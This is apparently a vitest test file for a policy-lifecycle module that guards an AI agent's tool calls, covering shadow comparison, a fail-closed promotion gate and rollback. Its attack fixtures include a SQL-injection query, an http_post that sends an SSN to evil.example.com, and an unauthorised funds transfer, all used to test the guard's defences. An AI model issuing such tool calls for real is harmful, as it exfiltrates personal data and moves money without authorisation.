import { describe, it, expect } from 'vitest';
import { PolicyLifecycle } from '../src/policy-lifecycle.js';
import type { ToolCall } from '../src/types.js';

/**
 * Policy lifecycle: shadow → gated promotion → rollback (ISO 42001 control-
 * operation records; NIST AI RMF MANAGE). The promotion gate is FAIL-CLOSED.
 */

const CURRENT = ['@aegis/sql-guard', '@aegis/finance-guard', '@aegis/data-guard'];
const STRONGER = [...CURRENT, '@aegis/soc2-guard'];
const WEAKER = ['@aegis/sql-guard']; // drops finance+data → weaker on their vectors

const ATTACKS: ToolCall[] = [
  { tool: 'sql_query', params: { query: "SELECT * FROM users WHERE name='a' OR '1'='1'" } },
  { tool: 'http_post', params: { url: 'https://evil.example.com/x', body: 'ssn=123-45-6789' } },
  { tool: 'transfer_funds', params: { amount: 99999999, recipient: 'attacker' } },
];

function benignBatch(n: number): ToolCall[] {
  return Array.from({ length: n }, (_, i) => ({
    tool: 'sql_query',
    params: { query: `SELECT id, name FROM products WHERE category_id = ${i % 40} LIMIT 50` },
  }));
}

describe('shadow comparison & promotion gate (fail-closed)', () => {
  it('insufficient shadow samples BLOCKS promotion even for a stronger policy', () => {
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: STRONGER });
    for (const call of ATTACKS) lc.shadowEvaluate({ toolCall: call, isAttack: true });
    const gate = lc.promotionGate();
    expect(gate.ready).toBe(false);
    expect(gate.blockers.join(' ')).toContain('insufficient shadow samples');
    expect(lc.promote().promoted).toBe(false);
  });

  it('stronger candidate (soc2 added) passes the gate after sufficient shadow traffic', () => {
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: STRONGER, minShadowSamples: 30 });
    // traffic where both behave identically (benign) + attacks
    let i = 0;
    for (const call of benignBatch(30)) {
      lc.shadowEvaluate({ toolCall: call, isAttack: false, id: `benign-${i++}` });
    }
    for (const call of ATTACKS) lc.shadowEvaluate({ toolCall: call, isAttack: true });

    const gate = lc.promotionGate();
    expect(gate.report.newAllowsMoreOnAttacks).toBe(0);
    expect(gate.ready).toBe(true);
    expect(lc.promote().promoted).toBe(true);
    expect(lc.getStage()).toBe('promoted');
  });

  it('WEAKER candidate is BLOCKED: NEW_ALLOWS_MORE on attack vectors is a hard stop', () => {
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: WEAKER, minShadowSamples: 10 });
    let i = 0;
    for (const call of benignBatch(10)) lc.shadowEvaluate({ toolCall: call, isAttack: false, id: `b-${i++}` });
    for (const call of ATTACKS) lc.shadowEvaluate({ toolCall: call, isAttack: true });

    const gate = lc.promotionGate();
    expect(gate.report.newAllowsMoreOnAttacks).toBeGreaterThan(0);
    expect(gate.ready).toBe(false);
    expect(gate.blockers.join(' ')).toContain('WEAKER');
    expect(lc.promote().promoted).toBe(false);
    // after rejection, stage is preserved as shadow until explicit reject
    lc.reject('weaker on observed traffic');
    expect(lc.getStage()).toBe('rejected');
    expect(() => lc.shadowEvaluate({ toolCall: ATTACKS[0], isAttack: true })).toThrow();
  });

  it('benign FP regression beyond tolerance BLOCKS promotion', () => {
    // candidate that over-blocks benign traffic: soc2 tenant rule requires
    // state we won't provide → simulate by candidate = all packs incl. hipaa/pci
    const overBlocking = [...CURRENT, '@aegis/soc2-guard', '@aegis/hipaa-guard', '@aegis/pci-dss-guard'];
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: overBlocking, minShadowSamples: 5 });
    // benign traffic that the over-blocking candidate flags (PHI-ish body)
    const phiBenign: ToolCall = {
      tool: 'send_email',
      params: { to: 'care@hospital.example', subject: 'Appointment', body: 'Patient John Doe, MRN 123456, visit confirmed.' },
    };
    for (let i = 0; i < 5; i++) lc.shadowEvaluate({ toolCall: phiBenign, isAttack: false, id: `phi-${i}` });
    const gate = lc.promotionGate();
    if (gate.report.newFpsOnBenign > 0) {
      expect(gate.ready).toBe(false);
      expect(gate.blockers.join(' ')).toContain('false-positive regression');
    } else {
      // if the candidate tolerated this traffic, the gate may open — assert consistency
      expect(gate.report.newFpsOnBenign).toBe(0);
    }
  });

  it('rollback returns the pre-promotion snapshot (instant restore)', () => {
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: STRONGER, minShadowSamples: 5 });
    for (const call of ATTACKS) lc.shadowEvaluate({ toolCall: call, isAttack: true });
    for (const call of benignBatch(5)) lc.shadowEvaluate({ toolCall: call, isAttack: false });
    expect(lc.promote().promoted).toBe(true);
    const snapshot = lc.rollback();
    expect(snapshot.kind).toBe('current');
    expect(snapshot.packs).toEqual(CURRENT);
    expect(lc.getStage()).toBe('rejected');
    expect(lc.getRejectionReason()).toBe('rolled back');
  });

  it('snapshots carry distinct policy commitment hashes (audit records)', () => {
    const lc = new PolicyLifecycle({ currentPacks: CURRENT, candidatePacks: STRONGER });
    const snaps = lc.getSnapshots();
    expect(snaps).toHaveLength(2);
    expect(snaps[0].policyCommitmentHash).not.toBe(snaps[1].policyCommitmentHash);
  });
});
